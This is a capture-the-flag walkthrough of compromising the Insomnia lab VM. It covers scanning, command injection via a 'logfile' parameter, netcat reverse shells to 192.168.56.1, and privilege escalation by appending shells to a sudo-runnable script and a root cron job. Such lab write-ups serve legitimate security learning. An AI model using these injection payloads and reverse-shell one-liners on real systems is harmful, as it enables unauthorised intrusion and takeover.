Walkthrough for Insomnia virtual Machine

Starting the attack I had to identify the virtual machine IP addr. I did this by running rubicon which is a script I programmed. The nmap scrip that it runs is "nmap -sn 192.168.0.0/24". This scans the range of IP's in that range to list all IP's on my network. To recreate this on your own network run ifconfig and if it returns 192.168.1.XXX then use 192.168.1.0/24 as your range or adapt for your IP addr. As you can see the NMAP scan returned the information below and I determined that
the target IP addr is 192.168.56.105

Script: 
```
nmap -sN 192.168.56.0/24
```
![Screenshot From 2025-06-24 11-29-52](https://github.com/user-attachments/assets/617fb1d2-75cf-4fb8-9def-e43aa674d35d)


After identifying the IP addr, I noticed port 8080 is open on the device. I then opened my browser and went to the address.

I was greeted with a login prompt. I left it the defualt username and hit enter,

Upon hitting enter I was greeted with a chat room. i then typed test and hit enter. The chat appeared in the chat window.

Address
```
192.168.56.105:8080
```

![Screenshot From 2025-06-24 11-35-31](https://github.com/user-attachments/assets/5deadb84-383b-4721-afec-a667b5fd6135)

![Screenshot From 2025-06-24 11-35-44](https://github.com/user-attachments/assets/b4734e75-1311-4069-8af5-8c109cf48258)


I inspected the page source and found nothing suspicious so I decided to ffuf scan the web address.

Script:
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .html,.php,.txt -u http://192.168.56.105:8080/FUZZ -of html -o dir.html -fs 2899
```

The scan revealed three pages to follow:
- administration.php
- chat.txt
- process.php

![Screenshot From 2025-06-24 11-38-25](https://github.com/user-attachments/assets/70cf8c22-d818-4a07-a6d5-3a2264a89148)

I entered chat.txt and noticed it was just a log of all the chats as a plain text file

![Screenshot From 2025-06-24 11-39-24](https://github.com/user-attachments/assets/ec94f1a8-6132-48a9-ba60-c61a3cf17012)

I then decided to go to administration.php and was greeted with a message stating access is denied and the actions had been logged.

![Screenshot From 2025-06-24 11-40-20](https://github.com/user-attachments/assets/a1a82a10-e0f9-46c7-b7a3-dc6d0a8308bd)

The "view :" seemed suspicious to me as it seemed like it was expecting something, maybe a file or something similar to state what the user is/isn't allowed to view. going back to the chat screen showed something was supposed to be posted, but it was empty.

![Screenshot From 2025-06-24 11-44-10](https://github.com/user-attachments/assets/f9a498b9-0348-4e0c-8428-4ea8ca44de23)

This seemed weird so I decided to run another ffuf scan on the administration.php address and it showed a file named "logfile".

Script:
```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.56.105:8080/administration.php?FUZZ=anything' -of html -o admin-get.html -fs 65
```

![Screenshot From 2025-06-24 11-42-14](https://github.com/user-attachments/assets/27a7a67b-f37f-47e0-8feb-25538e627ecb)

I decided to test for Local File Inclusion (LFI) by running ?logfile=chat.txt. that revealed a plain text view of the chat.txt file. 

![Screenshot From 2025-06-24 11-45-08](https://github.com/user-attachments/assets/482705ac-864b-48f4-8604-56fcc1a00ff2)

This allows us to use this chat file to display information about the system via a ";". I decided to try and view which user we were under on the website.

Address/Script:
```
?logfile=chat.txt;whoami
```

This revealed the user we are under within the webpage and confirms we can execute commands
![Screenshot From 2025-06-24 11-50-51](https://github.com/user-attachments/assets/271ff49b-6552-48fd-bd7a-f7fb802f8d50)

![Screenshot From 2025-06-24 11-51-43](https://github.com/user-attachments/assets/8806f46d-7f6f-4f9d-936c-becafe3500e1)

I decided to try and get a reverse shell on the machine using netcat (nc). Before we can execute nc we have to rememeber that we are "the machine", not technically a user on the device, so running all non-native commands, we have to find then out first. If we are going to use nc, we have to find out which nc to use.

Address/Script:
```
?logfile=chat.txt;which nc
```

![Screenshot From 2025-06-24 11-54-27](https://github.com/user-attachments/assets/368d4afd-07c1-4dfd-822b-5a390d824b2d)

This reveled nc was located at /usr/bin/nc meaning we can run it. I opened a listener on my local machine and invoked a remote connection on the website. and IT WORKED!!

Local Machine Script:
```
nc -lvnp 9000
```

Address/Script:
```
?logfile=;nc -e /bin/bash 192.168.56.1 9000
```

![Screenshot From 2025-06-24 12-06-00](https://github.com/user-attachments/assets/a88773cd-b346-4ef3-91b3-74b667fd5ccc)

![Screenshot From 2025-06-24 12-06-13](https://github.com/user-attachments/assets/276438d8-a555-49e3-9bd0-9e0b0f14ff64)

Now we have to verify who we are by running whoami in the remote shell.

Script:
```
whoami
```

That showed that we are infact www-data. Lets run a "sudo -l" to see what kind of sudo access we have.

Script:
```
sudo -l
```

This revealed that we can run a single file as another user named julia as sudo.

![Screenshot From 2025-06-24 12-08-11](https://github.com/user-attachments/assets/465e74c4-bce1-4895-b660-b8e16a7c0dc2)

Lets see what kind of access is on that file, who can do what and who owns it. I did this by running "ls -alps"

Script:
```
ls -alps
```

This revealed that other users other than root can write to it, so I added a binary bash at the end of the file which will execute when we run it. This will give us access to a shell under the user we execute the start.sh file as.

![Screenshot From 2025-06-24 12-11-00](https://github.com/user-attachments/assets/92efb56d-6b3f-4a93-b48f-0b8fde324492)

![Screenshot From 2025-06-24 12-11-51](https://github.com/user-attachments/assets/91a3272f-fbcd-4fe5-8aa5-61cf0b74a5c6)

I then executed the file as julia.

Script:
```
sudo -u julia bash /var/www/html/start.sh
```

And we were now able to execute commands as julia.

![Screenshot From 2025-06-24 12-12-49](https://github.com/user-attachments/assets/df85e883-e5b6-41b3-bda9-f99e13e3c510)

Now we have broke out of the www-data account we need to grab the user flag. lets get to the users home directory via a simple "cd" and see if the flag is there.

Script:
```
cd
ls -alps
```

![Screenshot From 2025-06-24 12-15-13](https://github.com/user-attachments/assets/1983c098-d21e-42d6-a04b-2b81e31d9b27)

We see a file called user.txt, catting it out gave us our first flag.

Script:
```
cat user.txt
```

![Screenshot From 2025-06-24 12-15-59](https://github.com/user-attachments/assets/b16b9139-080f-42e8-9168-02825df8f932)

Now we need to work on the root flag. Understanding the linux system and having done many machines, I always check the cron jobs first to see if there is any privlage escalation possible. This is always a good place to start as all cronjobs run as root on normal system. Lets dig into it.

Script:
```
cat /etc/crontab
```

![Screenshot From 2025-06-24 12-18-49](https://github.com/user-attachments/assets/8ed0ee43-c99b-42d3-9e49-fc9d619ec440)

this revealed a custom crontab added that ran a file called check.sh. Lets see the contents of that file. That revealed it was just running a loop every so often to ensure a service was running.

Script:
```
cat /var/cron/check.sh
```

![Screenshot From 2025-06-24 12-20-24](https://github.com/user-attachments/assets/9cce93a0-4f91-436d-b59d-036d44623044)

I decided to try and get it to invoke a reverse shell. I opened a listener on another terminal tab and added a reverse shell one-liner to the end of the file.

New Terminal Tab Script:
```
nc -lvnp 9001
```

Current Reverse Shell Script:
```
echo 'nc -e /bin/bash 192.168.56.1 9001' >> /var/cron/check.sh
```

![Screenshot From 2025-06-24 12-24-19](https://github.com/user-attachments/assets/c3c7de06-1905-4695-8935-ed266f4b177e)

After waiting a bit we received the connection. running a whoami verified we are root. Lets get this last flag.

![Screenshot From 2025-06-24 12-25-23](https://github.com/user-attachments/assets/e04a2e42-d9db-421c-a6aa-3ed11ae89ef1)

Obtaining the last flag was easy by running a cd and catting out the root.txt file

Script:
```
cd
ls -al
cat root.txt
```

![Screenshot From 2025-06-24 12-26-26](https://github.com/user-attachments/assets/e4628262-92ee-4cd3-8c6c-07369792185a)

With that, we've completed the machine. Thank you for reading. If you need clarification on anything, please feel free to ask OR go to my YouTube channel to watch the live walk-through.
